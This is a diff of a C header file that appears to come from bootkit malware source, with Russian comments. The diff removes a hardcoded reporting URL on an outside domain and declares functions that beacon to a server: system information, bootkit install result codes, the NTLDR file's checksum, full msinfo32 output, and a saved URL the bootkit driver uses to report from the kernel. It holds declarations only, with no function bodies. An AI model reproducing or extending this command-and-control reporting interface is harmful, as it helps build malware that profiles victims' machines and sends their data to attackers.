@@ -1,26 +1,31 @@
 #ifndef UUID_E4500F5134534F79A3663021D13CDBC8
 #define UUID_E4500F5134534F79A3663021D13CDBC8
 
-#define PP_REPORT_URL "http://kthjq.org/geter/indexb.php?"
+// Ф-ция инициализации отправки сообщений
+void DebugReportInit();
 
-#ifdef DBGRPT_ENABLED
-#	define PP_DBGRPT_FUNCTION_CALL(function) { (function); } ;
-#else 
-#	define PP_DBGRPT_FUNCTION_CALL(function) __noop
-#endif
+// Отстук с информацией о системе (будет заменяться контрольными точками в будущем)
+void DebugReportSystem();
 
-void DebugReportStep1();
-void DebugReportStep2(DWORD BkInstallResult);
-void DebugReportStep3();
-void DebugReportStep5();
-void DebugReportStep6();
+// Отстук с информацией о коде установки
+void DebugReportBkInstallCode(DWORD BkInstallResult);
 
+// Отстук по именной контрольной точке
 void DebugReportStepByName(const char* StepName);
+
+// Отстук с информацией о MD5 файла NTLDR
 void DebugReportUpdateNtldrCheckSum();
 
-void DebugReportSendSysInfo(PCHAR uid, PCHAR path);
+// Отправка полной системной информации (результат работы msinfo32.exe)
 void DebugReportCreateConfigReportAndSend();
 
-void DebugReportSaveSettings(bool StatEnabled, const char* StatPrefix, const char* StatUrl);
+// Сохранение URL, который будет использовать драйвер буткита для отстука из ядра
+bool DebugReportSaveUrlForBootkitDriver();
+
+// Сохранение параметров для команд, которые устанавливают параметры статистического отстука
+void DebugReportSaveSettings(const char* ParamsList);
+
+// Запуск тестов для просмотра отладочного вывода
+void DebugReportRunTests();
 
 #endif // #ifndef UUID_E4500F5134534F79A3663021D13CDBC8
